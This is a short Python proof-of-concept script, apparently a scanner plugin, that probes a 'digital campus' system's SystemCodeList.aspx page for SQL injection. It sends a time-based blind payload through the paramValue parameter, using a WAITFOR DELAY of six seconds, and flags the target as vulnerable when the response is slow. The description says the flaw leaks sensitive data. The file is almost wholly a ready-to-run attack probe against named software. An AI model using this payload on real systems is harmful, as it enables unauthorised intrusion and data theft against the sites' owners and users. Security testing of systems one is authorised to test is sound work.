# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
import time
class digital_campus_systemcodelist_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'digital',
            'vuln_title':'digital_campus_systemcodelist_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'/Code/Common/SystemCodeList.aspx文件中,参数paramValue未过滤导致SQL注入,泄露敏感数据'
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27;WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
        vulnurl = self.result['url'] + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if time.time() - start_time >= 6:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = digital_campus_systemcodelist_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)